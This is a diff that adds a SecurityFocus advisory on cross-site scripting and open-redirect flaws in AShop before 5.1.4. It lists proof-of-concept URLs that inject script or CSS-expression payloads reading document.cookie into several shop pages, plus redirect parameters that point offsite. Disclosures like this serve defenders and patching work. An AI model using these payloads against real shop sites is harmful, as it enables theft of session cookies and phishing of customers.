@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/50616/info
+
+AShop is prone to multiple open-redirection issues and multiple cross-site scripting issues because it fails to sufficiently sanitize user-supplied input.
+
+Attackers can exploit these issues to execute arbitrary script or HTML code, steal cookie-based authentication credentials, and conduct phishing attacks. Other attacks may also be possible.
+
+Versions prior to AShop 5.1.4 are vulnerable. 
+
+IE8
+
+http://www.example.com/ashop/?&#039;"<script>alert(document.cookie)</script>
+http://www.example.com/ashop/index.php?&#039;"<script>alert(document.cookie)</script>
+http://www.example.com/ashop/picture.php?picture=" stYle=x:expre/**/ssion(alert(document.cookie)) ns="
+http://www.example.com/ashop/index.php?language=&#039;"<script>alert(document.cookie)</script>
+
+FF 7.1
+
+http://www.example.com/ashop/index.php?searchstring=1&showresult=true&exp=&#039;"</script><script>alert(666);</script>&resultpage=&categories=off&msg=&search=index.php&shop=1
+http://www.example.com/ashop/catalogue.php?cat=3&exp=3&shop=3&resultpage=&#039;"</script><script>alert(document.cookie)</script>&msg=
+http://www.example.com/ashop/catalogue.php?cat=3&exp=3&shop=3&resultpage=1&msg=&#039;"</script><script>alert(document.cookie)</script>
+http://www.example.com/ashop/basket.php?cat=0&sid=&#039;"</script><script>alert(document.cookie)</script>&shop=1&payoption=3
+
+Open Redirection
+
+http://www.example.com/ashop/language.php?language=sv&redirect=http://www.google.com
+http://www.example.com/ashop/currency.php?currency=aud&redirect=http://www.google.com
+http://www.example.com/ashop/currency.php?redirect=http://www.google.com
